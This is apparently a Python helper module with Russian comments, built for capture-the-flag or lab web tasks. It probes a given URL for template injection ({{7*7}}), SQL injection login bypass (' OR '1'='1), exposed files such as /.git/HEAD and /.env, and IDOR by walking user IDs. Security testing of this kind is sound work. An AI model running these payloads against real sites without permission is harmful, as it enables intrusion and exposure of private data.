"""Быстрые пробы типовых уязвимостей. Импортировать из recon/exploit конкретной задачи.

Все функции принимают только URL/target выданной задачи. Ничего кроме него не трогают.
"""

import time

import requests

TIMEOUT = 10


def probe_ssti(url, param="name", value="Alice", method="GET"):
    """SSTI: подставляет {{7*7}} и считает, рендерится ли выражение (49)."""
    payload = "{{7*7}}"
    data = {param: payload} if method == "POST" else None
    params = {param: payload} if method == "GET" else None
    t0 = time.time()
    r = requests.request(method, url, params=params, data=data, timeout=TIMEOUT)
    dt = time.time() - t0
    rendered = "49" in r.text
    print(f"[SSTI] {method} {url} {param}={payload!r} -> {r.status_code}, "
          f"'49' in body: {rendered}, {dt:.2f}s")
    if rendered:
        print(f"       body[:300]: {r.text[:300]!r}")
    return rendered, r


def probe_sqli(url, param="username", method="POST"):
    """SQLi: классика ' OR '1'='1 — если авторизация проходит, инъекция есть."""
    baseline = requests.request(
        method, url, data={param: "definitely_no_such_user"}, timeout=TIMEOUT)
    payload = "' OR '1'='1"
    r = requests.request(method, url, data={param: payload}, timeout=TIMEOUT)
    print(f"[SQLi] {param}={payload!r} -> {r.status_code} "
          f"(baseline {baseline.status_code}, len {len(r.text)} vs {len(baseline.text)})")
    return r


def probe_paths(base, paths=("/robots.txt", "/.git/HEAD", "/admin", "/api", "/.env")):
    for p in paths:
        try:
            r = requests.get(base.rstrip("/") + p, timeout=TIMEOUT, allow_redirects=False)
            print(f"[PATH] {r.status_code} {p}" +
                  (f" -> {r.headers.get('Location')}" if r.headers.get("Location") else "") +
                  (f" body[:200]={r.text[:200]!r}" if r.status_code == 200 else ""))
        except requests.RequestException as e:
            print(f"[PATH] ERR {p}: {e}")


def probe_idor(base, fmt="/api/user/{}", ids=(1, 2, 3)):
    """IDOR: последовательные id без проверки прав."""
    for i in ids:
        try:
            r = requests.get(base.rstrip("/") + fmt.format(i), timeout=TIMEOUT)
            print(f"[IDOR] id={i} -> {r.status_code} body[:200]={r.text[:200]!r}")
        except requests.RequestException as e:
            print(f"[IDOR] ERR id={i}: {e}")
